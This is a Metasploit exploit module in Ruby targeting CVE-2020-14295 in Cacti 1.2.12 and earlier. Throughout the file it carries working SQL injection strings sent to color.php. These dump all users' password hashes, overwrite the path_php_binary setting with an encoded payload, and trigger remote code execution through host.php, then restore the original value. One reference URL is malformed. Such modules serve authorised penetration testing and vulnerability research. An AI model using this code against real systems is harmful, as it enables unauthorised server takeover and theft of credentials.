##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cacti color filter authenticated SQLi to RCE',
        'Description' => %q{
          This module exploits a SQL injection vulnerability in Cacti 1.2.12 and before. An admin can exploit the filter
          variable within color.php to pull arbitrary values as well as conduct stacked queries.  With stacked queries, the
          path_php_binary value is changed within the settings table to a payload, and an update is called to execute the payload.
          After calling the payload, the value is reset.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'h00die', # msf module
            'Leonardo Paiva', # edb, RCE
            'Mayfly277' # original github, M4yFly on twitter SQLi
          ],
        'References' =>
          [
            [ 'EDB', '49810' ],
            [ 'URL', 'https://github.commandcom/Cacti/cacti/issues/3622' ],
            [ 'CVE', '2020-14295' ]
          ],
        'Platform' => ['unix'],
        'Privileged' => false,
        'DefaultOptions' => {
          'PrependFork' => true
        },
        'Arch' => ARCH_CMD,
        'Notes' =>
          {
            'Stability' => [ CRASH_SAFE ],
            'Side Effects' => [ CONFIG_CHANGES, IOC_IN_LOGS ],
            'Reliability' => [ REPEATABLE_SESSION ]
          },
        'Targets' =>
          [
            [ 'Automatic Target', {}]
          ],
        'DisclosureDate' => '2020-06-17',
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),
        OptString.new('PASSWORD', [ false, 'Password to login with', 'admin']),
        OptString.new('TARGETURI', [ true, 'The URI of Cacti', '/cacti/']),
        OptBool.new('CREDS', [ false, 'Dump cacti creds', true])
      ], self.class
    )
  end

  def check
    begin
      res = send_request_cgi(
        'uri' => normalize_uri(target_uri.path, 'index.php'),
        'method' => 'GET'
      )
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") unless res.code == 200

      # cacti gives us the version in a JS variable
      /var cactiVersion='(?<version>\d{1,2}\.\d{1,2}\.\d{1,2})'/ =~ res.body

      if version && Rex::Version.new(version) <= Rex::Version.new('1.2.12')
        vprint_good("Version Detected: #{version}")
        return Exploit::CheckCode::Appears
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
    Exploit::CheckCode::Safe
  end

  def exploit
    begin
      cookie = login

      # optionally grab the un/pass fields for all users.  While we're already admin, cred stuffing...
      if datastore['CREDS']
        # https://user-images.githubusercontent.com/23179648/84865521-a213eb80-b078-11ea-985f-f994d3409c72.png
        print_status('Dumping creds')
        res = inject(cookie, "')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;")
        res.body.split.each do |cred|
          /"(?<username>[^"]+)","(?<hash>[^"]+)"/ =~ cred
          next unless hash
          next if hash == 'hex' # header row

          print_good("Username: #{username}, Password Hash: #{hash}")
          report_cred(
            username: username,
            password: hash,
            private_type: :nonreplayable_hash
          )
        end
      end

      print_status('Backing-up path_php_binary value')
      res = inject(cookie, "')+UNION+SELECT+1,value,3,4,5,6,7+from+settings+where+name='path_php_binary';")

      # return value:
      # "name","hex"
      # "","FEFCFF"
      # "/usr/bin/php","3"
      php_binary = res.body.split.last.split(',')[0].gsub('"', '') # take last entry on page, and split to value
      print_good("path_php_binary: #{php_binary}")
      fail_with(Failure::UnexpectedReply, "#{peer} - Unable to retrieve path_php_binary from server") unless php_binary

      print_status('Uploading payload')
      pload = Rex::Text.uri_encode(payload.encoded)
      begin
        inject(cookie, "')+UNION+SELECT+1,2,3,4,5,6,7;update+settings+set+value='#{pload}'+where+name='path_php_binary';")

        print_status('Triggering payload')
        send_request_cgi(
          'uri' => normalize_uri(target_uri.path, 'host.php'),
          'cookie' => cookie,
          'vars_get' => {
            'action' => 'reindex'
          }
        )
      ensure
        resetsqli(php_binary)
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end

  def login
    print_status('Grabbing CSRF')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php')
    )
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") unless res.code == 200

    /name='__csrf_magic' value="(?<csrf>[^"]+)"/ =~ res.body
    fail_with(Failure::UnexpectedReply, 'Unable to find CSRF token') unless csrf

    print_good("CSRF: #{csrf}")

    cookie = res.get_cookies

    print_status('Attempting login')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'POST',
      'cookie' => cookie,
      'vars_post' => {
        'login_username' => datastore['USERNAME'],
        'login_password' => datastore['PASSWORD'],
        'action' => 'login',
        '__csrf_magic' => csrf
      }
    )

    if res && res.code != 302
      fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})")
    end
    cookie
  end

  def inject(cookie, content)
    res = send_request_raw(
      'uri' => "#{normalize_uri(target_uri.path, 'color.php')}?action=export&header=false&filter=1#{content}--+-",
      'cookie' => cookie
    )

    if res && res.code != 200
      fail_with(Failure::UnexpectedReply, "#{peer} - Injection Failed (response code: #{res.code})")
    end
    res
  end

  def resetsqli(php_binary)
    print_status('Cleaning up environment')
    cookie = login # any request with our cookie now dont get a response, so we'll need to login a 2nd time to reset our value correctly
    print_status('Resetting DB Value')
    inject(cookie, "')+UNION+SELECT+1,2,3,4,5,6,7;update+settings+set+value='#{php_binary}'+where+name='path_php_binary';")
  end

  def report_cred(opts)
    service_data = {
      address: datastore['RHOST'],
      port: datastore['RPORT'],
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:username],
      private_data: opts[:password],
      private_type: opts[:private_type],
      jtr_format: identify_hash(opts[:password])
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: ''
    }.merge(service_data)
    create_credential_login(login_data)
  end

end
